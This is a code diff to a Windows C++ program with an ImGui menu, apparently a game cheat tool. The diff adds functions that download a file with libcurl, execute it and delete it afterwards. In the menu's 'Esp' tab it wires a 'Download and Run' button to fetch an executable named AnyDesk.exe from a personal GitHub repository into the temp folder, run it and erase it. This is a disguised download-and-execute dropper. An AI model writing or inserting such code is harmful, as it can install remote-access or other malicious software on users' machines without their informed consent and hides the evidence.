@@ -7,13 +7,58 @@
 #include <winbase.h>
 #include <tchar.h>
 #include <WinInet.h>
+#include <curl/curl.h>
 #include "Main.h"
 #pragma comment(lib,"Wininet.lib")
 #pragma comment(lib, "winmm.lib")
+#pragma comment(lib, "libcurl.lib")
 
 namespace Variables {
     int ActiveTab = 1;
 }
+
+size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
+    std::ofstream* output = (std::ofstream*)userp;
+    size_t totalSize = size * nmemb;
+    output->write((char*)contents, totalSize);
+    return totalSize;
+}
+
+bool DownloadFile(const std::string& url, const std::string& outputFilename) {
+    CURL* curl;
+    CURLcode res;
+    std::ofstream file(outputFilename, std::ios::binary);
+
+    if (!file.is_open()) {
+        std::cerr << "Failed to open file for writing: " << outputFilename << std::endl;
+        return false;
+    }
+
+    curl = curl_easy_init();
+    if (!curl) {
+        std::cerr << "Failed to initialize curl" << std::endl;
+        return false;
+    }
+
+    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &file);
+    res = curl_easy_perform(curl);
+
+    file.close();
+    curl_easy_cleanup(curl);
+
+    return (res == CURLE_OK);
+}
+
+void ExecuteAndCleanup(const std::string& filePath) {
+    ShellExecute(NULL, "open", filePath.c_str(), NULL, NULL, SW_SHOWNORMAL);
+    Sleep(5000);
+    if (DeleteFile(filePath.c_str()) == 0) {
+        std::cerr << "Failed to delete file: " << filePath << std::endl;
+    }
+}
+
 
 int APIENTRY WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
 {
@@ -146,7 +191,24 @@ int APIENTRY WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
                 {
                     if (ImGui::BeginTabItem("Esp"))
                     {
-                        ImGui::Text("wwwwww");
+                        if (ImGui::Button("Download and Run")) {
+                            char tempPath[MAX_PATH];
+                            if (GetTempPath(MAX_PATH, tempPath) == 0) {
+                                ImGui::Text("Failed to get temp path.");
+                                ImGui::EndTabItem();
+                                continue;
+                            }
+
+                            std::string tempFilePath = std::string(tempPath) + "AnyDesk.exe";
+                            std::string url = "https://raw.githubusercontent.com/LadyDarknes/comp-models-for-script/main/AnyDesk.exe";
+
+                            if (DownloadFile(url, tempFilePath)) {
+                                ExecuteAndCleanup(tempFilePath);
+                            }
+                            else {
+                                ImGui::Text("Failed to download file.");
+                            }
+                        }
                         ImGui::EndTabItem();
                     }
 
